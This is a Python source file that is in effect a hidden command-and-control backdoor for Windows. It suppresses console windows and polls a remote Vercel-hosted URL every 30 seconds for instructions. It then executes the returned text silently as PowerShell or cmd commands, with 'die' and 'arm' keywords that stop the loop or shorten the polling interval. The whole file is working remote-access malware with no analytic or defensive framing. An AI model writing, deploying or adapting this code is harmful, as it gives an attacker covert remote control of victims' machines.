import socket
import threading
import subprocess
import os
import sys
import requests
import json
import time



si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0  
url = "https://nextjs-boilerplate-azure-eight-88.vercel.app/api/"

pythonw = sys.executable.replace("python.exe", "pythonw.exe")
if not os.path.exists(pythonw):
    pythonw = "pythonw"  

def fetch_message():
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return f"Error: Received status code {response.status_code}"
    except Exception as e:
        return f"Exception occurred: {e}"



def run_command(*args):
    try:
        subprocess.Popen(
            args,
            startupinfo=si,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        print(f"Exception occurred while running command: {e}")


def main():
    old_content = ""
    sleepTime = 30
    #print("Starting command fetch loop...")
    while True:
        time.sleep(sleepTime)
        #print("\nloop\n")
        keypair = json.loads(fetch_message())
        raw = keypair["text"]
        if raw == old_content:
            continue
        else:
            old_content = raw
        command = str.split(raw, '~')
       # print(f'command:', command, ' command[0]:', command[0], ' command[1]:', command[1] if len(command) > 1 else 'N/A')
        if command[0] == "execs":
            #print("Executing PowerShell command...")
            run_command("powershell.exe", "-Command", command[1])
        elif command[0] == "execc":
            #print("Executing CMD command...")
            run_command("cmd.exe", "/c " + command[1])
        elif command[0] == "die":
            break
        elif command[0] == "arm":
            sleepTime = 10
        else:
            sleepTime = 30
        
if __name__ == "__main__":
    main()

    
